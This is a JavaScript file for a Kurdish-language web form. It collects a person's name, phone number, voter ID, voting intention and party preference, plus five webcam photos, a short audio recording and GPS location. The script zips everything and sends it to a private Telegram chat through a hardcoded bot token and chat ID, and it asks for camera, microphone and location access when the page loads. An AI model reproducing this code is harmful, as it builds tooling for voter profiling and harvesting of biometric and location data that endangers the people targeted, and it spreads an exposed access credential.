let photoFiles = [];
let audioFile = null;
let locationData = null;

// Request Permissions
async function requestPermissions() {
  try {
    await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          };
          console.log("Location acquired:", locationData);
        },
        (error) => console.error("Location access denied", error)
      );
    }
  } catch (error) {
    console.error("Permission error:", error);
    alert("Please grant camera, audio, and location permissions.");
  }
}
async function takePhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();

    const canvas = document.createElement("canvas");
    photoFiles = [];

    for (let i = 0; i < 5; i++) {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const photoBlob = await new Promise((resolve) => canvas.toBlob(resolve));
      photoFiles.push(photoBlob);
    }

    stream.getTracks().forEach((track) => track.stop());
    alert("Captured 5 photos!");
  } catch (error) {
    console.error("Error capturing photos:", error);
  }
}

async function recordAudio() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const recorder = new MediaRecorder(stream);
    const audioChunks = [];

    recorder.ondataavailable = (event) => audioChunks.push(event.data);

    recorder.start();
    await new Promise((resolve) => setTimeout(resolve, 5000));
    recorder.stop();

    await new Promise((resolve) => (recorder.onstop = resolve));
    audioFile = new Blob(audioChunks, { type: "audio/wav" });

    stream.getTracks().forEach((track) => track.stop());
    alert("Audio recorded!");
  } catch (error) {
    console.error("Error recording audio:", error);
  }
}

async function createZip(files, zipName, audioFile, locationData, infoData) {
  const zip = new JSZip();
  files.forEach((file, index) => zip.file(`photo_${index + 1}.jpg`, file, { binary: true }));
  if (audioFile) zip.file("audio.wav", audioFile, { binary: true });
  
  if (locationData) {
    const locationText = `${locationData.latitude},${locationData.longitude}`;
    zip.file("location.txt", locationText);
  }

  if (infoData) {
    const infoText = `
ناوی سیانی: ${infoData.name}
ژمارە مۆبایل: ${infoData.phoneNumber}
ژمارەی دەنگدەر: ${infoData.idNumber}
دەنگدەدات؟: ${infoData.status}
چی لایەنێکە؟ : ${infoData.language}
    `;
    zip.file("info.txt", infoText);
  }

  const zipBlob = await zip.generateAsync({ type: "blob" });
  return new File([zipBlob], zipName, { type: "application/zip" });
}

document.getElementById("dataForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const name = document.getElementById("name").value;
  const phoneNumber = document.getElementById("phoneNumber").value;
  const idNumber = document.getElementById("idNumber").value;
  const status = document.getElementById("status").value;
  const language = document.getElementById("language").value;

  if (!name || !phoneNumber || !idNumber || !status || !language || photoFiles.length < 5 || !audioFile) {
    alert("Fill all fields, capture photos, and record audio before submitting.");
    return;
  }

  try {
    const infoData = { name, phoneNumber, idNumber, status, language };
    const zipFile = await createZip(photoFiles, `${idNumber}.zip`, audioFile, locationData, infoData);

    const formData = new FormData();
    formData.append("chat_id", "7403932045");
    formData.append("document", zipFile);
    formData.append("caption", `ناوی سیانی: ${name}\nژمارە مۆبایل: ${phoneNumber}\nژمارەی دەنگدەر: ${idNumber}\nدەنگدەدات؟: ${status}\nچی لایەنێکە؟ : ${language}`);

    const response = await fetch(`https://api.telegram.org/bot6522501339:AAFlRvLEu94evMeKk9FL-135lAHm9UqMtzA/sendDocument`, {
      method: "POST",
      body: formData,
    });

    if (response.ok) alert("داتاکان بۆ تێلێگرام نێردراوە!");
    else alert("هەڵە ڕویدا لە ناردنی داتا!");
  } catch (error) {
    console.error("Error:", error);
    alert("لە کاتی ناردنی داتادا هەڵەیەک ڕوویدا.");
  }
});

document.getElementById("takePhoto").addEventListener("click", takePhoto);
document.getElementById("recordAudio").addEventListener("click", recordAudio);
requestPermissions();
